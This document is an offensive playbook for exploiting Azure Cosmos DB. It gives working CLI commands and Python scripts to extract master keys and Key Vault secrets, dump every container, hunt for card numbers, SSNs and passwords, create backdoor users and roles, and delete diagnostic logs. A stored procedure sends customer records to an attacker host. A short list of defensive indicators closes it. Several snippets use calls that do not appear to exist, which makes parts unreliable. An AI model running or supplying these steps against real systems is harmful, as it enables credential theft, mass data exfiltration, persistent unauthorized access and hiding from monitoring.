# Azure Cosmos DB Exploitation & Data Extraction

## Overview

Azure Cosmos DB is a distributed database with unique attack surface:
- Master key provides full database access
- Partition keys often predictable
- Weak network security configurations common
- Resource tokens have limited expiration
- Multi-master replication enables lateral movement
- Diagnostic logging frequently disabled

---

## Cosmos DB Enumeration

### 1. Identify Cosmos DB Instances

```bash
# List all Cosmos DB accounts
az cosmosdb list \
  --query '[].{Name:name, Endpoint:documentEndpoint, Locations:locations[].locationName}' \
  --output table

# Get detailed account information
az cosmosdb show \
  --name {account-name} \
  --resource-group {resource-group}

# List databases within account
az cosmosdb database list \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --output table
```

### 2. Extract Connection Credentials

```bash
# Get master key (requires appropriate permissions)
az cosmosdb keys list \
  --name {account-name} \
  --resource-group {resource-group} \
  --type keys \
  --output table

# Output includes:
# - primaryMasterKey
# - secondaryMasterKey
# - primaryReadonlyMasterKey
# - secondaryReadonlyMasterKey

# Get connection strings
az cosmosdb keys list \
  --name {account-name} \
  --resource-group {resource-group} \
  --type connection-strings \
  --output table
```

### 3. List Collections and Containers

```bash
# Using Azure CLI
az cosmosdb collection list \
  --db-name {database-name} \
  --account-name {account-name} \
  --resource-group {resource-group}

# Using Python SDK
python3 << 'EOF'
from azure.cosmos import CosmosClient

endpoint = "https://account.documents.azure.com:443/"
master_key = "{primary-master-key}"

client = CosmosClient(endpoint, master_key)
database = client.get_database_client('{database-name}')

containers = list(database.list_containers())
for container in containers:
    print(f"Container: {container['id']}")
    print(f"  Partition Key: {container.get('partitionKey', {}).get('paths', [])}")
    print(f"  RU/s: {container.get('throughput', {}).get('currentThroughput', 'N/A')}")
EOF
```

---

## Connection Methods

### 1. Direct Master Key Access

```bash
# Via Connection String
CONN_STR="AccountEndpoint=https://account.documents.azure.com:443/;AccountKey=primary-master-key=="

# Python connection
python3 << 'EOF'
from azure.cosmos import CosmosClient

conn_str = "${CONN_STR}"
client = CosmosClient.from_connection_string(conn_str)

# Query all items
database = client.get_database_client('production')
container = database.get_container_client('customers')

items = list(container.query_items(query="SELECT * FROM c", enable_cross_partition_query=True))
for item in items:
    print(item)
EOF
```

### 2. Via Resource Tokens

```bash
# Resource tokens have limited scope and expiration
# Generate token for specific container
az cosmosdb database/container get \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --database-name {database-name} \
  --container-name {container-name}

# Use resource token
python3 << 'EOF'
from azure.cosmos import CosmosClient

# Using resource token instead of master key
endpoint = "https://account.documents.azure.com/"
resource_token = "{container-resource-token}"

client = CosmosClient(endpoint, ('{resource-id}', resource_token))
EOF
```

### 3. Via Access Keys from Key Vault

```bash
# Cosmos DB credentials often stored in Key Vault
az keyvault secret list \
  --vault-name {keyvault-name} \
  --query '[*].name' --output tsv | grep -i cosmos

# Extract Cosmos DB connection string
COSMOS_CONN=$(az keyvault secret show \
  --vault-name {keyvault-name} \
  --name cosmosdb-connection-string \
  --query value --output tsv)

echo $COSMOS_CONN
```

---

## Data Enumeration & Extraction

### 1. Partition Key Discovery

```bash
# Understanding partition keys is critical for efficient queries
# Cosmos DB partitions data across physical partitions by key

# Query schema to find partition keys
python3 << 'EOF'
from azure.cosmos import CosmosClient

client = CosmosClient.from_connection_string("{connection_string}")
database = client.get_database_client("production")
container = database.get_container_client("customers")

# Get first item to understand structure
items = list(container.query_items("SELECT TOP 1 * FROM c"))
if items:
    first_item = items[0]
    print("Item structure:")
    for key in first_item:
        print(f"  {key}: {first_item[key]}")
EOF
```

### 2. Enumerate All Items

```bash
# Without partition key, requires cross-partition query
python3 << 'EOF'
from azure.cosmos import CosmosClient
import json

client = CosmosClient.from_connection_string("{connection_string}")
database = client.get_database_client("production")
container = database.get_container_client("customers")

# Cross-partition query (higher RU cost but gets all data)
items = list(container.query_items(
    query="SELECT * FROM c",
    enable_cross_partition_query=True
))

# Export to file
with open('customers_export.json', 'w') as f:
    json.dump(items, f, indent=2)

print(f"Exported {len(items)} items")
EOF
```

### 3. Find Sensitive Data

```bash
# Query for items matching sensitive patterns
python3 << 'EOF'
from azure.cosmos import CosmosClient

client = CosmosClient.from_connection_string("{connection_string}")
database = client.get_database_client("production")
container = database.get_container_client("users")

# Find users with payment information
query = """
SELECT * FROM c 
WHERE 
  IS_DEFINED(c.creditCard) OR 
  IS_DEFINED(c.ssn) OR 
  IS_DEFINED(c.password) OR
  CONTAINS(c.email, 'admin')
"""

sensitive_items = list(container.query_items(query=query, enable_cross_partition_query=True))
print(f"Found {len(sensitive_items)} sensitive items")

for item in sensitive_items[:10]:  # Print first 10
    print(item)
EOF
```

---

## Bulk Data Extraction

### 1. Export via SDK

```bash
#!/bin/bash
# Complete data extraction script

cat > extract_cosmos.py << 'EOF'
from azure.cosmos import CosmosClient
import json
import gzip
from datetime import datetime

CONNECTION_STRING = "{connection_string}"
client = CosmosClient.from_connection_string(CONNECTION_STRING)

# Iterate through all databases
for database_link in client.query_databases("SELECT * FROM root"):
    db = client.get_database_client(database_link['id'])
    print(f"[*] Exporting database: {database_link['id']}")
    
    # Iterate through all containers
    for container_link in db.query_containers("SELECT * FROM root"):
        container = db.get_container_client(container_link['id'])
        print(f"  [*] Exporting container: {container_link['id']}")
        
        # Export all items
        items = list(container.query_items(
            query="SELECT * FROM c",
            enable_cross_partition_query=True
        ))
        
        # Save to compressed file
        filename = f"{database_link['id']}-{container_link['id']}-{datetime.now().timestamp()}.json.gz"
        with gzip.open(filename, 'wt') as f:
            json.dump(items, f)
        
        print(f"    [+] Exported {len(items)} items to {filename}")

print("[+] Extraction complete")
EOF

python3 extract_cosmos.py
```

### 2. Export via Azure Data Factory

```bash
# If Data Factory is configured, exploit it for bulk export
az datafactory show \
  --name {data-factory-name} \
  --resource-group {resource-group}

# Create copy pipeline
az datafactory pipeline create \
  --name export-cosmos \
  --data-factory-name {data-factory-name} \
  --resource-group {resource-group} \
  --pipeline '{
    "activities": [{
      "type": "Copy",
      "typeProperties": {
        "source": {
          "type": "CosmosDbSqlApiSource",
          "query": "SELECT * FROM c"
        },
        "sink": {
          "type": "BlobSink"
        }
      }
    }]
  }'
```

### 3. Export via Bulk Executor

```bash
# Azure Cosmos DB Bulk Executor Library for high-performance exports
python3 << 'EOF'
from azure.cosmos import CosmosClient
from azure.cosmos.bulk_executor import BulkExecutor

client = CosmosClient.from_connection_string("{connection_string}")
database = client.get_database_client("production")
container = database.get_container_client("customers")

# Use bulk executor for efficient export
bulk_executor = BulkExecutor(client, "{partition_key_path}")

# Read all items
items_to_export = list(container.query_items(
    query="SELECT * FROM c",
    enable_cross_partition_query=True
))

# Export (can be thousands of items efficiently)
for item in items_to_export:
    print(item)
EOF
```

---

## Privilege Escalation

### 1. Exploit Master Key Exposure

```bash
# Master key provides unrestricted access
# If exposed, attacker gets:
# - Full read/write access
# - Access to all databases/containers
# - Ability to modify connection policies
# - Administrative operations

# With master key, modify RBAC
az cosmosdb sql role definition create \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --body '{
    "Id": "backdoor-role",
    "RoleName": "BackdoorRole",
    "Type": "CustomRole",
    "Permissions": [{
      "DataActions": ["Microsoft.DocumentDB/databaseAccounts/readMetadata", 
                      "Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/executeQuery"],
      "NotDataActions": []
    }]
  }'
```

### 2. Escalate via Role Assignments

```bash
# Create custom role with excessive permissions
az cosmosdb sql role definition create \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --body '{
    "Id": "escalated-role",
    "RoleName": "EscalatedAccess",
    "Type": "CustomRole",
    "Permissions": [{
      "DataActions": ["Microsoft.DocumentDB/databaseAccounts/*"],
      "NotDataActions": []
    }]
  }'

# Assign to principal
az cosmosdb sql role assignment create \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --role-definition-id escalated-role \
  --scope "/dbs//*" \
  --principal-id {user-object-id}
```

---

## Persistence Installation

### 1. Create Backdoor User

```bash
python3 << 'EOF'
from azure.cosmos import CosmosClient

client = CosmosClient.from_connection_string("{master_connection_string}")
database = client.get_database_client("_system")

# Create backdoor user with elevated permissions
user_definition = {
    "id": "backdoor-user",
    "permissions": [{
        "id": "all-permissions",
        "resource": "/",
        "permissionMode": "All"
    }]
}

try:
    existing_user = database.get_user_link(user_definition['id'])
    database.delete_user(existing_user)
except:
    pass

new_user = database.create_user(user_definition)
print(f"Created user: {new_user['id']}")

# Get resource token for persistence
resource_token = database.get_permission_definition(
    user_id=new_user['id'],
    permission_id="all-permissions"
)['_token']

print(f"Resource token: {resource_token}")
EOF
```

### 2. Trigger-Based Data Exfiltration

```bash
# Cosmos DB stored procedures can run on schedule
python3 << 'EOF'
from azure.cosmos import CosmosClient

client = CosmosClient.from_connection_string("{connection_string}")
database = client.get_database_client("production")
container = database.get_container_client("customers")

# Create stored procedure for scheduled exfiltration
sproc_definition = {
    "id": "hidden_exfil_proc",
    "body": """
    function exfiltrateData() {
        var context = getContext();
        var response = context.getResponse();
        
        var query = 'SELECT * FROM root r WHERE IS_DEFINED(r.email)';
        var isAccepted = context.getCollection().queryDocuments(
            context.getCollection().getSelfLink(),
            query,
            {},
            function (err, items) {
                if (err) throw err;
                
                // Send to external endpoint
                var httpRequest = new XMLHttpRequest();
                httpRequest.open('POST', 'https://attacker-exfil.com/data', false);
                httpRequest.setRequestHeader('Content-Type', 'application/json');
                httpRequest.send(JSON.stringify(items));
            }
        );
        
        if (!isAccepted) throw new Error('Query was not accepted for execution');
    }
    """
}

sproc = container.scripts.create_stored_procedure(sproc_definition)
print(f"Created stored procedure: {sproc['id']}")
EOF
```

### 3. Role-Based Access Hijacking

```bash
# If you can modify role definitions, create permanent access
az cosmosdb sql role definition create \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --body '{
    "Id": "persistence-role",
    "RoleName": "PersistenceRole",
    "Type": "BuiltInRole",
    "Permissions": [{
      "DataActions": [
        "Microsoft.DocumentDB/databaseAccounts/readMetadata",
        "Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/executeQuery",
        "Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/readDocument",
        "Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/createDocument"
      ]
    }]
  }'

# Assign to service principal under your control
az cosmosdb sql role assignment create \
  --account-name {account-name} \
  --resource-group {resource-group} \
  --role-definition-id persistence-role \
  --scope "/dbs/production/*" \
  --principal-id {your-service-principal-id}
```

---

## Detection Evasion

### 1. Disable Diagnostic Logging

```bash
# Turn off logging to hide access patterns
az monitor diagnostic-settings delete \
  --name cosmosdb-logs \
  --resource /subscriptions/{sub-id}/resourceGroups/{rg}/providers/Microsoft.DocumentDB/databaseAccounts/{account-name}
```

### 2. Query Obfuscation

```bash
# Use stored procedures to hide queries
python3 << 'EOF'
from azure.cosmos import CosmosClient

client = CosmosClient.from_connection_string("{connection_string}")
container = client.get_database_client("production").get_container_client("customers")

# Instead of direct query, use stored procedure
sproc_def = {
    "id": "hidden_query",
    "body": """
    function getItems(query) {
        var context = getContext();
        var collection = context.getCollection();
        var response = context.getResponse();
        
        var isAccepted = collection.queryDocuments(
            collection.getSelfLink(),
            query,
            {},
            function(err, items) {
                if(err) throw err;
                response.setBody(items);
            }
        );
        
        if(!isAccepted) throw new Error('Query rejected');
    }
    """
}

container.scripts.create_stored_procedure(sproc_def)

# Execute via stored procedure (harder to trace)
container.scripts.execute_stored_procedure(
    sproc_id="hidden_query",
    params=["SELECT * FROM c WHERE c.sensitive = true"]
)
EOF
```

---

## Comprehensive Cosmos DB Attack

```bash
#!/bin/bash
# Complete Cosmos DB exploitation chain

echo "[*] Azure Cosmos DB Exploitation"

# 1. Enumerate accounts
echo "[*] Enumerating Cosmos DB accounts..."
az cosmosdb list --output table > accounts.txt

# 2. For each account, extract credentials
while read -r account; do
  echo "[+] Processing $account"
  
  # Get master key
  MASTER_KEY=$(az cosmosdb keys list \
    --name $account \
    --resource-group {rg} \
    --type keys \
    --query primaryMasterKey \
    --output tsv)
  
  # Get connection string
  CONN_STR=$(az cosmosdb keys list \
    --name $account \
    --resource-group {rg} \
    --type connection-strings \
    --query connectionStrings[0].connectionString \
    --output tsv)
  
  echo "  Master Key: $MASTER_KEY"
  echo "  Connection: $CONN_STR" | head -c 50
  echo "..."
done < accounts.txt

# 3. Export all data
echo "[*] Exporting all data..."
python3 extract_cosmos.py

# 4. Install persistence
echo "[*] Installing persistence..."
# (Use Python SDK code above)

echo "[+] Exploitation complete"
```

---

## Defensive Indicators

Monitor for:
- Master key extraction via Azure CLI/PowerShell
- Unusual Cosmos DB queries (especially cross-partition)
- Creation of new users or role assignments
- Stored procedure creation
- Diagnostic log deletion or disabling
- Bulk data exports (high RU consumption)
- Access outside normal business hours
- Access from unusual IP ranges or locations
- Creation of new Cosmos DB accounts
- Replication to untrusted regions
